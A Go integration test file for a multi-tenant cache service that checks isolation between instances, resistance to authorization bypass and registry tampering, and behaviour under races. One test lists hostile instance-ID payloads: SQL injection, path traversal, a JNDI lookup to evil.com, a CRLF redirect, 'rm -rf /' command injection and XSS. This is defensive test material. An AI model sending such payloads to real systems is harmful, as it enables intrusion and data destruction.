package integration

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"

	"github.com/birbparty/birb-nest/internal/cache"
	"github.com/birbparty/birb-nest/internal/instance"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestInstanceSecurityBoundaries tests security isolation between instances
func TestInstanceSecurityBoundaries(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping integration test in short mode")
	}

	resetAll(t)

	// Create test API instance
	app, err := createTestAPI()
	require.NoError(t, err)

	t.Run("Instance ID injection attempts", func(t *testing.T) {
		// Try various injection patterns in instance ID
		maliciousIDs := []string{
			"inst_test\x00injected",                    // null byte injection
			"inst_test';DROP TABLE users;--",           // SQL injection
			"inst_test/../../../etc/passwd",            // path traversal
			"inst_test<script>alert(1)</script>",       // XSS attempt
			"inst_test${jndi:ldap://evil.com}",         // log4j style
			"inst_test%00%00",                          // URL encoded nulls
			"inst_test\r\nX-Instance-ID: admin",        // header injection
			"inst_test|rm -rf /",                       // command injection
			"inst_test$(whoami)",                       // command substitution
			"inst_test`whoami`",                        // backtick injection
			"inst_test{{7*7}}",                         // template injection
			"inst_test%0d%0aLocation: http://evil.com", // CRLF injection
			"../../../inst_admin",                      // relative path
			"\\\\..\\\\..\\\\inst_admin",               // Windows path traversal
			"inst_test\u0000injected",                  // Unicode null
			"inst_test\x1b[31mred",                     // ANSI escape codes
		}

		for _, maliciousID := range maliciousIDs {
			// Try to set data with malicious instance ID
			req := httptest.NewRequest("POST", "/v1/cache/security-test",
				bytes.NewBufferString(`{"data":"test"}`))
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("X-Instance-ID", maliciousID)

			resp, err := app.Test(req, -1)
			require.NoError(t, err)

			// Should either reject or safely handle the ID
			if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
				// If accepted, verify it was safely handled
				responseID := resp.Header.Get("X-Instance-ID")
				assert.NotContains(t, responseID, "\x00", "Should not contain null bytes")
				assert.NotContains(t, responseID, "..", "Should not contain path traversal")
				assert.NotContains(t, responseID, "<", "Should not contain HTML")
				assert.NotContains(t, responseID, ">", "Should not contain HTML")
				assert.NotContains(t, responseID, "'", "Should not contain SQL quotes")
				assert.NotContains(t, responseID, ";", "Should not contain SQL semicolons")
			}
		}
	})

	t.Run("Cross-instance data access attempts", func(t *testing.T) {
		// Set up two instances with data
		instance1 := "inst_secure_1"
		instance2 := "inst_secure_2"

		// Set secret data in instance 1
		secretKey := "secret:api:key"
		secretValue := map[string]interface{}{
			"api_key":     "super_secret_key_123",
			"permissions": []string{"read", "write", "admin"},
		}

		body, _ := json.Marshal(secretValue)
		req := httptest.NewRequest("POST", fmt.Sprintf("/v1/cache/%s", secretKey),
			bytes.NewBuffer(body))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("X-Instance-ID", instance1)

		resp, err := app.Test(req, -1)
		require.NoError(t, err)
		assert.Equal(t, http.StatusCreated, resp.StatusCode)

		// Try to access instance1's data from instance2
		getReq := httptest.NewRequest("GET", fmt.Sprintf("/v1/cache/%s", secretKey), nil)
		getReq.Header.Set("X-Instance-ID", instance2)

		getResp, err := app.Test(getReq, -1)
		require.NoError(t, err)

		// Should not find the data
		assert.Equal(t, http.StatusNotFound, getResp.StatusCode)

		// Try to manipulate the key to access cross-instance
		manipulatedKeys := []string{
			fmt.Sprintf("../inst_%s/%s", instance1, secretKey),
			fmt.Sprintf("../../instance:%s:cache:%s", instance1, secretKey),
			fmt.Sprintf("%s/../%s", secretKey, instance1),
			fmt.Sprintf("instance:%s:cache:%s", instance1, secretKey),
		}

		for _, manipKey := range manipulatedKeys {
			req := httptest.NewRequest("GET", fmt.Sprintf("/v1/cache/%s", manipKey), nil)
			req.Header.Set("X-Instance-ID", instance2)

			resp, err := app.Test(req, -1)
			require.NoError(t, err)

			// Should either return 404 or 400, never the actual data
			assert.True(t, resp.StatusCode == http.StatusNotFound ||
				resp.StatusCode == http.StatusBadRequest,
				"Manipulated key %s should not allow cross-instance access", manipKey)
		}
	})

	t.Run("Authorization bypass attempts", func(t *testing.T) {
		// Test various attempts to bypass instance authorization

		// Valid instance
		validInstance := "inst_authorized"

		// Set data with valid instance
		req := httptest.NewRequest("POST", "/v1/cache/auth-test",
			bytes.NewBufferString(`{"data":"authorized"}`))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("X-Instance-ID", validInstance)

		resp, err := app.Test(req, -1)
		require.NoError(t, err)
		assert.Equal(t, http.StatusCreated, resp.StatusCode)

		// Try to access with various bypass attempts
		bypassAttempts := []struct {
			name        string
			headers     map[string]string
			queryParams string
		}{
			{
				name: "Duplicate headers",
				headers: map[string]string{
					"X-Instance-ID": "inst_unauthorized",
					"x-instance-id": validInstance, // lowercase duplicate
				},
			},
			{
				name: "Header and query param mismatch",
				headers: map[string]string{
					"X-Instance-ID": "inst_unauthorized",
				},
				queryParams: fmt.Sprintf("?instance_id=%s", validInstance),
			},
			{
				name: "Multiple instance IDs in header",
				headers: map[string]string{
					"X-Instance-ID": fmt.Sprintf("inst_unauthorized,%s", validInstance),
				},
			},
			{
				name: "Instance ID with whitespace",
				headers: map[string]string{
					"X-Instance-ID": fmt.Sprintf(" %s ", validInstance),
				},
			},
		}

		for _, attempt := range bypassAttempts {
			t.Run(attempt.name, func(t *testing.T) {
				url := "/v1/cache/auth-test"
				if attempt.queryParams != "" {
					url += attempt.queryParams
				}

				req := httptest.NewRequest("GET", url, nil)
				for k, v := range attempt.headers {
					req.Header.Set(k, v)
				}

				resp, err := app.Test(req, -1)
				require.NoError(t, err)

				// Should either properly handle or reject
				// If successful, verify correct instance was used
				if resp.StatusCode == http.StatusOK {
					instanceUsed := resp.Header.Get("X-Instance-ID")
					// Should normalize to a single valid instance
					assert.True(t,
						instanceUsed == "inst_unauthorized" ||
							instanceUsed == validInstance,
						"Should use a consistent instance ID")
				}
			})
		}
	})

	t.Run("Resource exhaustion protection", func(t *testing.T) {
		// Test protection against attempts to exhaust resources per instance

		ctx := context.Background()
		instance1 := cache.NewInstanceCache(testCache, "inst_resource_1")

		// Try to create many keys quickly
		const numKeys = 10000
		errors := 0

		for i := 0; i < numKeys; i++ {
			key := fmt.Sprintf("resource:key:%d", i)
			value := fmt.Sprintf("value_%d", i)

			err := instance1.Set(ctx, key, []byte(value), 0)
			if err != nil {
				errors++
			}
		}

		// Some errors are acceptable if there are rate limits
		// But we should be able to set most keys
		assert.Less(t, errors, numKeys/10, "Should be able to set most keys without hitting limits")

		// Try to create very large keys
		veryLongKey := strings.Repeat("a", 1024*1024) // 1MB key
		err := instance1.Set(ctx, veryLongKey, []byte("test"), 0)
		// Should either succeed or fail gracefully
		if err != nil {
			assert.Contains(t, err.Error(), "key too long", "Should have meaningful error for long keys")
		}
	})

	t.Run("Metadata tampering protection", func(t *testing.T) {
		// Test that instance metadata cannot be tampered with

		ctx := context.Background()
		registry := instance.NewRegistry(testCache)

		// Create an instance
		inst := &instance.Context{
			InstanceID: "inst_metadata_test",
			GameType:   "minecraft",
			Region:     "us-east-1",
			Status:     instance.StatusActive,
			Metadata: map[string]string{
				"owner": "legitimate_user",
				"role":  "player",
			},
		}

		err := registry.Register(ctx, inst)
		require.NoError(t, err)

		// Try to access registry keys directly
		// This simulates an attacker trying to modify instance metadata
		maliciousCache := cache.NewInstanceCache(testCache, "inst_attacker")

		// Try to overwrite registry data
		registryKeys := []string{
			"instance:registry:inst_metadata_test",
			"instance:registry:list",
			"instance:metadata:inst_metadata_test",
			"registry:instance:inst_metadata_test",
		}

		for _, key := range registryKeys {
			err := maliciousCache.Set(ctx, key, []byte(`{"role":"admin"}`), 0)
			// Should not affect the actual registry

			// Verify original metadata is intact
			retrieved, err := registry.Get(ctx, "inst_metadata_test")
			if err == nil {
				assert.Equal(t, "player", retrieved.Metadata["role"],
					"Metadata should not be tamperable via direct cache access")
			}
		}
	})

	t.Run("Instance enumeration prevention", func(t *testing.T) {
		// Test that instances cannot enumerate other instances' data

		// Create instances with predictable patterns
		instances := []string{
			"inst_customer_001",
			"inst_customer_002",
			"inst_customer_003",
			"inst_internal_admin",
			"inst_internal_service",
		}

		// Set data in each instance
		for _, instID := range instances {
			req := httptest.NewRequest("POST", "/v1/cache/enumeration-test",
				bytes.NewBufferString(fmt.Sprintf(`{"instance":"%s"}`, instID)))
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("X-Instance-ID", instID)

			resp, err := app.Test(req, -1)
			require.NoError(t, err)
			assert.Equal(t, http.StatusCreated, resp.StatusCode)
		}

		// Try to enumerate from a customer instance
		customerInstance := "inst_customer_001"

		// Attempt pattern-based enumeration
		patterns := []string{
			"enumeration-test*",
			"*",
			"inst_*",
			"inst_customer_*",
			"inst_internal_*",
		}

		for _, pattern := range patterns {
			// Try to list keys with pattern
			req := httptest.NewRequest("GET", fmt.Sprintf("/v1/cache/keys?pattern=%s", pattern), nil)
			req.Header.Set("X-Instance-ID", customerInstance)

			resp, err := app.Test(req, -1)
			require.NoError(t, err)

			// If the endpoint exists and returns data, verify it's only for this instance
			if resp.StatusCode == http.StatusOK {
				var result map[string]interface{}
				json.NewDecoder(resp.Body).Decode(&result)

				// Should only see own instance's data
				if keys, ok := result["keys"].([]interface{}); ok {
					for _, key := range keys {
						keyStr := key.(string)
						assert.NotContains(t, keyStr, "inst_customer_002",
							"Should not see other customer's keys")
						assert.NotContains(t, keyStr, "inst_internal",
							"Should not see internal instance keys")
					}
				}
			}
		}
	})
}

// TestInstanceSecurityUnderLoad tests security boundaries under high load
func TestInstanceSecurityUnderLoad(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping integration test in short mode")
	}

	ctx := context.Background()
	resetAll(t)

	t.Run("Concurrent instance creation with collision attempts", func(t *testing.T) {
		registry := instance.NewRegistry(testCache)

		const numGoroutines = 50
		const attemptsPerGoroutine = 20

		// Try to create instances with the same ID concurrently
		targetID := "inst_concurrent_target"
		successCount := 0
		var mu sync.Mutex
		var wg sync.WaitGroup

		for i := 0; i < numGoroutines; i++ {
			wg.Add(1)
			go func(goroutineID int) {
				defer wg.Done()

				for j := 0; j < attemptsPerGoroutine; j++ {
					inst := &instance.Context{
						InstanceID: targetID,
						GameType:   fmt.Sprintf("game_%d", goroutineID),
						Region:     fmt.Sprintf("region_%d", goroutineID),
						Status:     instance.StatusActive,
						Metadata: map[string]string{
							"creator": fmt.Sprintf("goroutine_%d", goroutineID),
						},
					}

					err := registry.Register(ctx, inst)
					if err == nil {
						mu.Lock()
						successCount++
						mu.Unlock()
					}
				}
			}(i)
		}

		wg.Wait()

		// Only one should succeed
		assert.Equal(t, 1, successCount, "Only one instance creation should succeed")

		// Verify the instance data is consistent
		inst, err := registry.Get(ctx, targetID)
		require.NoError(t, err)
		assert.NotEmpty(t, inst.GameType)
		assert.NotEmpty(t, inst.Region)
		assert.NotEmpty(t, inst.Metadata["creator"])
	})

	t.Run("Race condition in cross-instance access", func(t *testing.T) {
		// Test for race conditions that might temporarily allow cross-instance access

		instance1 := cache.NewInstanceCache(testCache, "inst_race_1")
		instance2 := cache.NewInstanceCache(testCache, "inst_race_2")

		const numOperations = 1000
		violations := 0
		var mu sync.Mutex
		var wg sync.WaitGroup

		// Goroutine 1: Rapidly set/delete in instance1
		wg.Add(1)
		go func() {
			defer wg.Done()
			for i := 0; i < numOperations; i++ {
				key := fmt.Sprintf("race:key:%d", i%10)
				value := fmt.Sprintf("inst1_value_%d", i)

				instance1.Set(ctx, key, []byte(value), 0)
				if i%3 == 0 {
					instance1.Delete(ctx, key)
				}
			}
		}()

		// Goroutine 2: Try to read from instance2
		wg.Add(1)
		go func() {
			defer wg.Done()
			for i := 0; i < numOperations; i++ {
				key := fmt.Sprintf("race:key:%d", i%10)

				if val, err := instance2.Get(ctx, key); err == nil {
					// Should never get instance1's value
					if strings.Contains(string(val), "inst1_value") {
						mu.Lock()
						violations++
						mu.Unlock()
					}
				}
			}
		}()

		wg.Wait()

		assert.Equal(t, 0, violations, "Should have no cross-instance data leaks under race conditions")
	})
}

// TestInstanceBoundaryEdgeCases tests edge cases in instance boundaries
func TestInstanceBoundaryEdgeCases(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping integration test in short mode")
	}

	ctx := context.Background()
	resetAll(t)

	t.Run("Empty instance ID handling", func(t *testing.T) {
		// Test how system handles empty instance IDs
		emptyCache := cache.NewInstanceCache(testCache, "")

		// Should either use default or error
		err := emptyCache.Set(ctx, "test:key", []byte("test"), 0)
		if err == nil {
			// If it succeeds, verify it's isolated from other instances
			normalCache := cache.NewInstanceCache(testCache, "inst_normal")
			err = normalCache.Set(ctx, "test:key", []byte("normal"), 0)
			require.NoError(t, err)

			// Should be isolated
			val, _ := emptyCache.Get(ctx, "test:key")
			assert.Equal(t, "test", string(val))

			val, _ = normalCache.Get(ctx, "test:key")
			assert.Equal(t, "normal", string(val))
		}
	})

	t.Run("Very long instance ID handling", func(t *testing.T) {
		// Test with extremely long instance IDs
		longID := "inst_" + strings.Repeat("a", 1000)
		longCache := cache.NewInstanceCache(testCache, longID)

		err := longCache.Set(ctx, "long:test", []byte("value"), 0)
		// Should either work or fail gracefully
		if err == nil {
			val, err := longCache.Get(ctx, "long:test")
			require.NoError(t, err)
			assert.Equal(t, "value", string(val))
		} else {
			assert.Contains(t, err.Error(), "too long", "Should have meaningful error message")
		}
	})

	t.Run("Instance ID with Redis protocol characters", func(t *testing.T) {
		// Test instance IDs that might interfere with Redis protocol
		problematicIDs := []string{
			"inst_$test",
			"inst_*all",
			"inst_[bracket]",
			"inst_?question",
			"inst_\r\n",
			"inst_$1\r\n",
		}

		for _, id := range problematicIDs {
			cache := cache.NewInstanceCache(testCache, id)

			// Try basic operations
			err := cache.Set(ctx, "protocol:test", []byte("value"), 0)
			if err == nil {
				// Verify isolation still works
				val, err := cache.Get(ctx, "protocol:test")
				if err == nil {
					assert.Equal(t, "value", string(val), "Should maintain data integrity with protocol chars")
				}
			}
		}
	})
}
